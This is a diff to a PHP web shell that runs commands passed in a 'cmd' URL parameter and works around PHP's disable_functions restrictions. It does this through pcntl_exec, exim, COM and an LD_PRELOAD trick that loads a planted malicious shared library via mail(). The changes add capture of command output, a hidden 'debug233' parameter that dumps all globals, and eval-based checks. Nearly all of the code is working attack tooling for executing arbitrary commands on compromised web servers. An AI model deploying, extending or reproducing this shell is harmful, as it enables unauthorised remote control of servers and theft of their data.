@@ -1,15 +1,18 @@
 <?php
 
-//let's go
 error_reporting(0);
 
-$cmd = $_GET['cmd'] ? $_GET['cmd']: $argv[1];
-//$methods_map = array();
-
+$cmd = isset($_GET['cmd']) ? $_GET['cmd']: $argv[1];
+$debug = isset($_GET['debug233'])? $_GET['debug233']: 0;
 
 SetEnvironment();
 $directly_functions = CheckDirectlyFunctions();
 $directly_classes = CheckDirectlyClasses();
+
+if ($debug === 'debug') {
+	var_dump($GLOBALS);
+}
+
 if (directly_function_exec($cmd))
 	exit(0);
 
@@ -36,7 +39,7 @@ function CheckDirectlyFunctions() {
 	$disabled = get_cfg_var("disable_functions");
 	if ($disabled) {
 		$disable_functions = explode(',', preg_replace('/ /m', '', $disabled));
-
+/*
 		$directly_functions = array_filter(
 			$directly_functions,
 			function ($func) use ($disable_functions){
@@ -46,19 +49,19 @@ function CheckDirectlyFunctions() {
 					return true;
 			}
 		);
-	}
-/*
-	$directly_functions = array_filter(
-		$directly_functions,
-		function ($func) use ($disable_functions){
-			if (in_array($func, $disable_functions))
-				return false;
-			else
-				return true;
-		}
-	);
 */
-	return $directly_functions;
+		$usable_funcs = array();
+		foreach ($directly_functions as $func) {
+			if (!in_array($func, $disable_functions)) {
+				$usable_funcs[] = $func;
+			}
+		}
+	}
+	else {
+		$usable_funcs = $directly_functions;
+	}
+
+	return $usable_funcs;
 }
 
 
@@ -71,7 +74,7 @@ function CheckDirectlyClasses() {
 	$disabled = get_cfg_var("disable_classes");
 	if ($disabled) {
 		$disable_classes = explode(',', preg_replace('/ /m', '', $disabled));
-
+/*
 		$directly_classes = array_filter(
 			$directly_classes,
 			function ($cls) use ($disable_classes) {
@@ -81,9 +84,19 @@ function CheckDirectlyClasses() {
 					return true;
 			}
 		);
+*/
+		$usable_cls = array();
+		foreach($directly_classes as $cls) {
+			if (!in_array($cls, $disable_classes)) {
+				$usable_cls[] = $cls;
+			}
+		}
+	}
+	else {
+		$usable_cls = $directly_classes;
 	}
 
-	return $directly_classes;
+	return $usable_cls;
 }
 
 
@@ -116,12 +129,12 @@ function SetEnvironment() {
 
 	global $methods_map;
 	$methods_map = array(
-		array("(version_compare(PHP_VERSION, '4.1.9') === 1) && function_exists(pcntl_exec) && PHP_OS !== 'WINNT'", 'php5_pcntl_exec'),
-		array("file_exists('/usr/sbin/exim4') && PHP_OS !== 'WINNT' && function_exists(mail)", 'exim_exec'),
-		array("class_exists(COM)", 'COM_exec'),
-		array("function_exists(mail) && PHP_OS !== 'WINNT'", 'ld_preload_exec')
+		array("(version_compare(PHP_VERSION, '4.1.9') === 1) && function_exists('pcntl_exec') && PHP_OS !== 'WINNT'", 'php5_pcntl_exec'),
+		array("file_exists('/usr/sbin/exim4') && PHP_OS !== 'WINNT' && function_exists('mail')", 'exim_exec'),
+		array("class_exists('COM')", 'COM_exec'),
+		array("function_exists('mail') && PHP_OS !== 'WINNT'", 'ld_preload_exec')
 	);
-
+/*
 	$methods_map = array_filter(
 		$methods_map,
 		function ($method) {
@@ -133,6 +146,17 @@ function SetEnvironment() {
 				return false;
 		}
 	);
+*/
+	$usable_methods = array();
+	foreach ($methods_map as $method) {
+		$cond = $method[0];
+		eval("\$isOK = ($cond);");
+		if ($isOK) {
+			$usable_methods[] = $method;
+		}
+	}
+
+	$methods_map = $usable_methods;
 }
 
 
@@ -298,7 +322,7 @@ function COM_exec($cmd) {
  * 
  * function_exists(mail) && PHP_OS !== 'WINNT'
  */
-function ld_preload_exec($cmd) {
+function _ld_preload_exec($cmd, $result_path) {
 	$cmd_env = 'ScriptKiddies';
 	$shared_file_x86_content = '~x86.so~';
 	$shared_file_x64_content = '~x64.so~';
@@ -314,20 +338,30 @@ function ld_preload_exec($cmd) {
 	else
 		return false;
 
+	$result_path = $result_path . '/' . random_str();
+	$cmd = '/bin/bash -c ' . escapeshellarg($cmd) . '> ' . $result_path; 
+
 	putenv("LD_PRELOAD={$evilso}");
 	putenv("{$cmd_env}={$cmd}");
 
 	mail('', '', '', '', '');
+	echo file_get_contents($result_path);
+
 	unlink($evilso);
+	unlink($result_path);
 }
 
 
+function ld_preload_exec($cmd) {
+	_ld_preload_exec($cmd, '/var/lock'); //result path cant contain 'tmp'... dont know why...
+}
+
 
 function DOTNET_exec($cmd) {
-
+	//to do...
 }
 
 
 function mod_cgi_exec($cmd) {
-
+	//to do...
 }
